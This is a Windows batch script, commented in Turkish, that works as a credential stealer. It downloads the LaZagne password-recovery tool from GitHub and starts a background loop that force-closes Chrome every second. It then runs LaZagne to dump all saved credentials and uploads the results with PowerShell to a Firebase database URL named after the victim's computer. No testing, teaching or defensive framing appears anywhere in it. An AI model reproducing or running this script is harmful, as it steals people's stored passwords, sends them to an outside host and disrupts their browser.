@echo on
setlocal enabledelayedexpansion

set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZ_EXE=%TEMP%\lazagne.exe"
set "RESULT_DIR=%TEMP%\results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%"

echo [*] Script basladi: %DATE% %TIME%

:: LaZagne yoksa indir
if not exist "%LAZ_EXE%" (
    echo [*] LaZagne indiriliyor...
    powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
) else (
    echo [*] LaZagne zaten var.
)

:: Chrome'u sürekli kapatacak döngü başlat (arka planda)
start "" cmd /c ":loop & taskkill /IM chrome.exe /F >nul 2>&1 & timeout /t 1 >nul & goto loop"

:: Sonuç klasörü yoksa oluştur
if not exist "%RESULT_DIR%" mkdir "%RESULT_DIR%"

:: LaZagne çalıştır
"%LAZ_EXE%" all -oN "%RESULT_DIR%\lazagne_results.txt"

:: Firebase'e yükle
for %%F in ("%RESULT_DIR%\*") do (
    powershell -Command ^
      "$content = Get-Content -Raw -Path '%%F'; ^
       Invoke-RestMethod -Uri '%FIREBASE_URL%/%%~nxF.json' -Method PUT -Body $content"
)

echo [*] Tamamlandi: %DATE% %TIME%
pause
exit /b 0
